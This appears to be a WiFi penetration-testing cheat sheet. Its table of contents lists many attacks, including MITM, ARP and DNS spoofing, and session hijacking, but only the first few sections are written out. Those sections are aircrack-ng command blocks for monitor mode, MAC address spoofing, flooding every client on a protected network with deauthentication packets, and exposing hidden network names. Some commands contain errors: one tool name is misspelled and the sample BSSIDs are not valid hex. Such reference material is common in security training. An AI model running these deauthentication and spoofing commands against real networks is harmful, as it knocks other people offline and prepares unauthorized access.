## Table of Contents

* [General WiFi Information](#general-wifi-information)
* [Enabling Monitor mode](#enabling-monitor-mode)
* [Attack/PenTesting](#attackpentesting)
  * [Pre-connection Attacks](#Pre-connection-Attacks)
    * [MAC address changing](#MAC-address-changing)
    * [Deauthenticating All Clients From Protected WiFi Network](#Deauthenticating-All-Clients-From-Protected-WiFi-Network)
    * [Deauthenticating a Client From Protected WiFi Networks](#Deauthenticating-a-Client-From-Protected-WiFi-Networks)
  * [Gaining Access](#encryption-attack)
    * [Discovering Names of Hidden Networks](#Discovering-Names-of-Hidden-Networks)
    * [Bypass MAC filtering](#wps)
    * [Captive portals](#others)
	* [WEP ](#others)
	* [WPA ](#others)
	* [WPA 2](#others)
	* [WPA/WPA2 Enterpise](#others)
	* [Fake Access Point](#others)
  * [Post-connection Attacks](#injection)
    * [Capture data](#wepwpawpa2)
    * [Information Gathering](#wps)
    * [Bypass HTTPs](#others)
	* [Bypass router-side security features ](#others)
	* [MITM Attack ](#others)
	* [ARP spoofing](#others)
	* [DNS spoofing](#others)
	* [DoS Attack ](#others)
	* [Data Modification ](#others)
	* [Sniffing Cookies](#others)
	* [Session Hijacking](#others)
	* [Other Attacks](#others)
## Enabling Monitor mode
```Bash
  > iwconfig
  > airmon-ng check kill  
  > airmon-ng start wlan1 
  > airodump-ng wlan1mon 
    OR
  > airodump-ng --band a wlan1mon (show all type of wifi networks 5 Ghz or 2.4 Ghz)
  ```
  ## Pre-connection Attacks
### MAC address changing
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
 ### Deauthenticating All Clients From Protected WiFi Network
```Bash
  > airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
  > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0  
  ```
### Deauthenticating a Client From Protected WiFi Networks
```Bash
  > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0  
  ```
  ## Gaining Access
 ### Discovering Names of Hidden Networks
```Bash
  > airodump-ng --bssid 44:55:tt:ee:ee:bb --channel 6 wlan0
  > airoplay-ng --deauth 4 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0  
  ```
